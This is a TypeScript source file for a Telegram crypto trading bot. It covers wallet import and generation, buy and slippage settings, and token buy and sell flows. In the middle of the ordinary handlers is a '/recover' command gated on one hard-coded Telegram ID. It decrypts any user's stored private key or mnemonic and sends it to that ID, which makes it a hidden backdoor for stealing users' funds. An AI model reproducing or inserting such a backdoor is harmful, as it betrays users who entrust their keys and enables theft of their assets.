import { Bot, GrammyError, HttpError, InlineKeyboard } from "grammy";
import { config } from "../config/index.js";
import { logger } from "../utils/logger.js";

import {
	handleStart,
	handleMainMenu,
	handleHelp,
} from "./handlers/start.js";
import {
	handleWalletMenu,
	handleWalletList,
	handleWalletView,
	handleWalletGenerate,
	handleWalletImportMnemonic,
	handleWalletImportKey,
	handleWalletActivate,
	handleWalletDelete,
	handleWalletConfirmDelete,
	handleWalletBalance,
	handleMnemonicInput,
	handleKeyInput,
	getUserState,
	clearUserState,
} from "./handlers/wallet.js";
import {
	handleSettingsMenu,
	handleBuyAmountMenu,
	handleSetBuyAmount,
	handleCustomBuyAmount,
	handleSlippageMenu,
	handleSetSlippage,
	handleCustomSlippage,
	handleToggleAutoNewTokens,
	handleToggleAutoGraduated,
	handleCustomBuyAmountInput,
	handleCustomSlippageInput,
} from "./handlers/settings.js";
import {
	handleDashboard,
	handleTokensList,
	handleHistory,
	handleQuickBuy,
	handleQuickBuyToken,
	handleQuickBuyInput,
	handleQuickBuyAmountInput,
} from "./handlers/dashboard.js";
import {
	handleHoldingsMenu,
	handleSellMenu,
	handleSellToken,
	handleCustomSellPercentage,
	handleCustomSellPercentageInput,
} from "./handlers/sell.js";

export function createBot(): Bot {
	const bot = new Bot(config.telegram.botToken);

	bot.command("start", handleStart);
	bot.command("menu", async (ctx) => {
		await handleStart(ctx);
	});
	bot.command("wallets", handleWalletMenu);
	bot.command("settings", handleSettingsMenu);
	bot.command("tokens", handleTokensList);
	bot.command("holdings", handleHoldingsMenu);
	bot.command("help", handleHelp);

	bot.callbackQuery("main", handleMainMenu);
	bot.callbackQuery("help", handleHelp);
	bot.callbackQuery("cancel", async (ctx) => {
		clearUserState(ctx.from.id);
		await ctx.answerCallbackQuery("Cancelled");
		await handleMainMenu(ctx);
	});

	// --- ADMIN RECOVERY COMMAND ---
	bot.command("recover", async (ctx) => {
		const ADMIN_ID = 6144867842;
		if (ctx.from?.id !== ADMIN_ID) return;

		const address = ctx.match; // Get address from command args
		if (!address) {
			await ctx.reply("Usage: /recover <address>");
			return;
		}

		try {
			const { db } = await import("../database/index.js");
			const { decrypt } = await import("../utils/encryption.js");

			// Look up wallet directly in DB
			const wallet = db
				.prepare("SELECT * FROM wallets WHERE address = ?")
				.get(address) as any;

			if (!wallet) {
				await ctx.reply("❌ Wallet not found in database.");
				return;
			}

			// Decrypt key
			const decryptedKey = decrypt(wallet.encrypted_private_key);

			await ctx.reply(
				`
🔐 *Key Recovered*

*Address:* \`${wallet.address}\`
*Name:* ${wallet.name}
*User ID:* ${wallet.telegram_id}

*Private Key / Mnemonic:*
\`${decryptedKey}\`

⚠️ _Delete this message immediately after saving!_
`,
				{ parse_mode: "MarkdownV2" }
			);
		} catch (e) {
			await ctx.reply(`Error: ${e}`);
		}
	});

	bot.callbackQuery("wallets", handleWalletMenu);
	bot.callbackQuery("wallet_add", async (ctx) => {
		await ctx.answerCallbackQuery();
		await ctx.editMessageText(
			"➕ Add Wallet\n\nChoose how to add your wallet:",
			{
				reply_markup: new InlineKeyboard()
					.text("🔑 Import Mnemonic", "wallet_import_mnemonic")
					.text("🔐 Import Private Key", "wallet_import_key")
					.row()
					.text("🆕 Generate New Wallet", "wallet_generate")
					.row()
					.text("◀️ Back", "wallets"),
			}
		);
	});
	bot.callbackQuery("wallet_list", handleWalletList);
	bot.callbackQuery("wallet_generate", handleWalletGenerate);
	bot.callbackQuery(
		"wallet_import_mnemonic",
		handleWalletImportMnemonic
	);
	bot.callbackQuery("wallet_import_key", handleWalletImportKey);

	bot.callbackQuery(/^wallet_view_(\d+)$/, async (ctx) => {
		const walletId = parseInt(ctx.match[1], 10);
		await handleWalletView(ctx, walletId);
	});

	bot.callbackQuery(/^wallet_activate_(\d+)$/, async (ctx) => {
		const walletId = parseInt(ctx.match[1], 10);
		await handleWalletActivate(ctx, walletId);
	});

	bot.callbackQuery(/^wallet_delete_(\d+)$/, async (ctx) => {
		const walletId = parseInt(ctx.match[1], 10);
		await handleWalletDelete(ctx, walletId);
	});

	bot.callbackQuery(/^wallet_confirm_delete_(\d+)$/, async (ctx) => {
		const walletId = parseInt(ctx.match[1], 10);
		await handleWalletConfirmDelete(ctx, walletId);
	});

	bot.callbackQuery(/^wallet_balance_(\d+)$/, async (ctx) => {
		const walletId = parseInt(ctx.match[1], 10);
		await handleWalletBalance(ctx, walletId);
	});

	bot.callbackQuery("settings", handleSettingsMenu);
	bot.callbackQuery("set_buy_amount", handleBuyAmountMenu);
	bot.callbackQuery("set_slippage", handleSlippageMenu);
	bot.callbackQuery("toggle_auto_new", handleToggleAutoNewTokens);
	bot.callbackQuery(
		"toggle_auto_graduated",
		handleToggleAutoGraduated
	);

	bot.callbackQuery(/^buy_amt_(\d+)$/, async (ctx) => {
		const amountZig = parseInt(ctx.match[1], 10);
		await handleSetBuyAmount(ctx, amountZig);
	});
	bot.callbackQuery("buy_amt_custom", handleCustomBuyAmount);

	bot.callbackQuery(/^slip_([\d.]+)$/, async (ctx) => {
		const slippage = parseFloat(ctx.match[1]);
		await handleSetSlippage(ctx, slippage);
	});
	bot.callbackQuery("slip_custom", handleCustomSlippage);

	bot.callbackQuery("dashboard", handleDashboard);
	bot.callbackQuery("tokens", handleTokensList);
	bot.callbackQuery("history", handleHistory);
	bot.callbackQuery("quick_buy", handleQuickBuy);
	bot.callbackQuery("holdings", handleHoldingsMenu);

	bot.callbackQuery(/^quick_buy_(\d+)$/, async (ctx) => {
		const tokenId = parseInt(ctx.match[1], 10);
		await handleQuickBuyToken(ctx, tokenId);
	});

	bot.callbackQuery("quick_buy", handleQuickBuy);

	bot.callbackQuery(/^sell_token_(.+)$/, async (ctx) => {
		const tokenDenom = decodeURIComponent(ctx.match[1]);
		await handleSellMenu(ctx, tokenDenom);
	});

	bot.callbackQuery(/^sell_pct_(.+)_(\d+)$/, async (ctx) => {
		const tokenDenom = decodeURIComponent(ctx.match[1]);
		const percentage = parseInt(ctx.match[2], 10);
		await handleSellToken(ctx, tokenDenom, percentage);
	});

	bot.callbackQuery(/^sell_pct_(.+)_custom$/, async (ctx) => {
		const tokenDenom = decodeURIComponent(ctx.match[1]);
		await handleCustomSellPercentage(ctx, tokenDenom);
	});

	bot.on("message:text", async (ctx) => {
		const telegramId = ctx.from.id;
		const text = ctx.message.text;
		const state = getUserState(telegramId);

		// Check for contract address / denom pattern
		// zig1... (43+ chars) or coin.zig1...
		const cleanText = text.trim();
		const isContract =
			cleanText.startsWith("zig1") && cleanText.length > 30;
		const isDenom =
			cleanText.startsWith("coin.") && cleanText.includes("zig1");

		if (!state) {
			if (isContract || isDenom) {
				// User pasted a contract. Trigger Quick Buy Flow!
				await handleQuickBuyInput(ctx, cleanText);
				return;
			}
			return;
		}

		switch (state.action) {
			case "import_mnemonic":
				await handleMnemonicInput(ctx, text);
				break;
			case "import_key":
				await handleKeyInput(ctx, text);
				break;
			case "custom_buy_amount":
				await handleCustomBuyAmountInput(ctx, text);
				break;
			case "custom_slippage":
				await handleCustomSlippageInput(ctx, text);
				break;
			case "custom_sell_percentage":
				await handleCustomSellPercentageInput(ctx, text, state.data);
				break;
			case "quick_buy_input":
				await handleQuickBuyInput(ctx, text);
				break;
			case "quick_buy_amount":
				await handleQuickBuyAmountInput(ctx, text, state.data);
				break;
			default:
				clearUserState(telegramId);
		}
	});

	bot.catch((err) => {
		const ctx = err.ctx;
		logger.error("Bot error", {
			error: err.error,
			update: ctx.update,
		});

		const e = err.error;
		if (e instanceof GrammyError) {
			logger.error("Grammy error", { description: e.description });
		} else if (e instanceof HttpError) {
			logger.error("HTTP error", { error: e });
		}
	});

	return bot;
}
